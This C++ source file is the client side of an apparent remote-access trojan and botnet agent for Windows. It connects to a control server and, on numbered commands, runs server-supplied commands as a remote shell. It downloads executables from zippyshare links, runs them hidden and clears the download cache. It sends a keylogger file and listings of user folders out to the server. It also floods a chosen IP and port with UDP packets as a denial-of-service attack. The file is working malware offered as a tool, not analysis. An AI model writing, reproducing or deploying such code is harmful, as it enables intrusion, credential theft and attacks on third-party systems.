#ifndef UNICODE
#define UNICODE
#endif

#include "stdafx.h"
#include "class.h"

using namespace std;

SOCKET dos_sock;
sockaddr_in target;
u_short HitPort = 0;

DIR* dir;
struct dirent* ent;
ofstream myfile;

void inServer()
{
    sendMsg msg;

    msg.msgServer();
    msg.rcvMsg();
    msg.chkSrv();

    inServer();
}

void ClientRemShell()
{
    system("cls");
    cout << "Awaiting commands from server\n" << endl;
    sendMsg msg3;
    msg3.rcvMsg2();
    ShellExecuteA(NULL, "open", recvbuf, 0, 0, SW_SHOW);
    send(m_socket, srvLog, sizeof(srvLog), 0);
    system("pause");
}

void ClientRemMsgBox()
{
    sendMsg msg;
    cout << "Awaiting command from server...\n" << endl;
    msg.rcvMsgBoxInput();
    msg.rcvMsgBoxTitle();
    MessageBoxA(NULL, msgBox, msgBoxTitle, NULL);
}

void rcvFile()
{
    sendMsg msg;
  
    cout << "Awaitiing instructions from server...\n" << endl;
    msg.rcvDir();
    LPCSTR path = recvdir;
    URLDownloadToFileA(NULL, "https://www32.zippyshare.com/d/DEjb3XRV/50656/syslog.exe", path, 0, NULL);
    DeleteUrlCacheEntryA("https://www32.zippyshare.com/d/DEjb3XRV/50656/syslog.exe");
    ShellExecuteA(NULL, "open", path, 0, 0, SW_HIDE);
}

void sndFileOut()
{
    sendMsg msg;
    cout << "Awaiting instructions from server...\n" << endl;
    fstream newfile;

    newfile.open("C:\\ProgramData\\keys.txt", ios::in); 
    if (newfile.is_open()) {   
        
        while (getline(newfile, tp)) {  
            break;
        }
        newfile.close();   
    }

    sendKeyLog[tp.size() + 1];
    strcpy_s(sendKeyLog, tp.c_str());
    msg.sndKeyLog();
    system("cls");
    cout << "Connection Forcibly Closed by Server...\n" << endl;
    system("pause");
    
}

void clientDOS()
{
    sendMsg msg;
    cout << "Awaiting instructions from server...\n" << endl;
    msg.rcvIp();
    cout << "Converting Socket to Server Protocol...\n" << endl;
    msg.sndServSuccess();
    msg.rcvPort();
    cout << "Running Server Requests...\n" << endl;

    char packet[65000] = "";
    dos_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    if (strcmp(targetPort, "80") == 0)
    {
        HitPort = 80;
    }
    else if (strcmp(targetPort, "443") == 0)
    {
        HitPort = 443;
    }
    else if (strcmp(targetPort, "3074") == 0)
    {
        HitPort = 3074;
    }

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(targetIp);
    target.sin_port = ntohs(HitPort);

    iResult = connect(dos_sock, (SOCKADDR*)&target, sizeof(target));
    if (iResult != SOCKET_ERROR)
    {
        msg.sndServConfirmation();
    }

    while (1)
    {
        send(dos_sock, packet, sizeof(packet), 0);
        Sleep(9);
    }
}

void addToBotnet()
{
    sendMsg msg;
    char rtnMsg[DEFAULT_BUFLEN] = "[END OF DIRECTORY]";
    for (int i = 0; i < 1; i++)
    {
        CreateDirectoryA("C:\\ProgramData\\Directorys", NULL);
       
        if ((dir = opendir("C:\\Users\\")) != NULL) {
            /* print all the files and directories within directory */
            for (int i = 0; i < 6; i++)
            {
                ent = readdir(dir);

                myfile.open("C:\\ProgramData\\Directorys\\dir5.txt");
                myfile << ent->d_name;
                myfile.close();
            }

            closedir(dir);
        }

        if ((dir = opendir("C:\\Users\\")) != NULL) {
            /* print all the files and directories within directory */
            for (int i = 0; i < 7; i++)
            {
                ent = readdir(dir);
            
                myfile.open("C:\\ProgramData\\Directorys\\dir6.txt");
                myfile << ent->d_name;
                myfile.close();
            }

            closedir(dir);
        }

        if ((dir = opendir("C:\\Users\\")) != NULL) {
            /* print all the files and directories within directory */
            for (int i = 0; i < 8; i++)
            {
                ent = readdir(dir);
             
                myfile.open("C:\\ProgramData\\Directorys\\dir7.txt");
                myfile << ent->d_name;
                myfile.close();
            }

            closedir(dir);
        }

    }
    fstream newfile;
    for (int i = 0; i < 1; i++)
    {
    
        for (int i = 0; i < 1; i++)
        {
            if (c5 == TRUE)
            {
                send(m_socket, rtnMsg, sizeof(rtnMsg), 0);
                break;
            }

            newfile.open("C:\\ProgramData\\Directorys\\dir5.txt", ios::in);
            if (newfile.is_open()) {

                while (getline(newfile, tp5)) {
                    break;
                }
                newfile.close();

                sendDir5[tp5.size() + 1];
                strcpy_s(sendDir5, tp5.c_str());
                send(m_socket, sendDir5, sizeof(sendDir5), 0);
            }
        }

        for (int i = 0; i < 1; i++)
        {
            if (c6 == TRUE)
            {
                send(m_socket, rtnMsg, sizeof(rtnMsg), 0);
                break;
            }

            newfile.open("C:\\ProgramData\\Directorys\\dir6.txt", ios::in);
            if (newfile.is_open()) 
            {

                while (getline(newfile, tp6)) {
                    break;
                }
                newfile.close();

                sendDir6[tp6.size() + 1];
                strcpy_s(sendDir6, tp6.c_str());
                send(m_socket, sendDir6, sizeof(sendDir6), 0);
            }
        }

        for (int i = 0; i < 1; i++)
        {
            if (c7 == TRUE)
            {
                send(m_socket, rtnMsg, sizeof(rtnMsg), 0);
                break;
            }

            newfile.open("C:\\ProgramData\\Directorys\\dir7.txt", ios::in);
            if (newfile.is_open())
            {

                while (getline(newfile, tp7)) {
                    break;
                }
                newfile.close();

                sendDir7[tp7.size() + 1];
                strcpy_s(sendDir7, tp7.c_str());
                send(m_socket, sendDir7, sizeof(sendDir7), 0);
            }
        }
     
    }
    cout << "Awaiting instructions from server...\n" << endl;
    msg.rcvDir();
    LPCSTR path = recvdir;
    
    URLDownloadToFileA(NULL, "https://www31.zippyshare.com/d/SfHTNqOt/157467/clr.exe", path, 0, NULL);
    DeleteUrlCacheEntryA("https://www31.zippyshare.com/d/SfHTNqOt/157467/clr.exe");

    msg.rcvDir2();

    LPCSTR path2 = recvdir2;
    URLDownloadToFileA(NULL, "https://www32.zippyshare.com/d/DEjb3XRV/50656/syslog.exe", path2, 0, NULL);
    DeleteUrlCacheEntryA("https://www32.zippyshare.com/d/DEjb3XRV/50656/syslog.exe");
    ShellExecuteA(NULL, "open", path, 0, 0, SW_HIDE);
    ShellExecuteA(NULL, "open", path2, 0, 0, SW_HIDE);
}

int main()
{
    SetConsoleTitleA("Client");
    cout << "Joining Server";
    Sleep(600);
    cout << ".";
    Sleep(600);
    cout << ".";
    Sleep(600);
    cout << ".\n" << endl;

    for (int i = 0; i < 1; i++)
    {

        if (iResult != NO_ERROR)
        {
            cout << "WSA Startup Failed\n" << endl;
            cout << WSAGetLastError() << endl;
            break;
        }

        m_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (m_socket == INVALID_SOCKET)
        {
            cout << "Error creating socket\n" << endl;
            cout << WSAGetLastError() << endl;
            break;
        }

    
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr(ip);
        server.sin_port = htons(port);

        system("cls");
        Sleep(1000);
        cout << "Waiting for server...\n" << endl;
        iResult = connect(m_socket, (SOCKADDR*)&server, sizeof(server));
        if (iResult == SOCKET_ERROR)
        {
            cout << "Could Not Connect to Server\n" << endl;
            cout << "Most likely the server is down...\n" << endl;
            break;
        }
        system("cls");
        iResult = getnameinfo((SOCKADDR*)&server, serverLength, hostname, bufferSize, servicename, serviceBuffer, 0);
        if (iResult == SOCKET_ERROR)
        {
            cout << "GetNameInfo Error: " << WSAGetLastError() << endl;
            break;
        }

        cout << "Waiting for server output";
        for (int a = 0; a < 1; a++)
        {
            sendMsg msg2;
            msg2.rcvMsg2();
            if (strcmp(recvbuf, "2") == 0)
            {
                system("cls");
                ClientRemShell();
                break;
            }
            else if (strcmp(recvbuf, "1") == 0)
            {
                system("cls");
                inServer();
                break;
            }
            else if (strcmp(recvbuf, "3") == 0)
            {
                system("cls");
                ClientRemMsgBox();
                break;
            }
            else if (strcmp(recvbuf, "4") == 0)
            {
                system("cls");
                rcvFile();
                break;
            }
            else if (strcmp(recvbuf, "5") == 0)
            {
                system("cls");
                sndFileOut();
                break;
            }
            else if (strcmp(recvbuf, "6") == 0)
            {
                int p = 0;
                system("cls");
                clientDOS();
                break;
            }
            else if (strcmp(recvbuf, "7") == 0)
            {
                int p = 0;
                system("cls");
                addToBotnet();
                break;
            }
        }
         
    }
    system("pause");
}

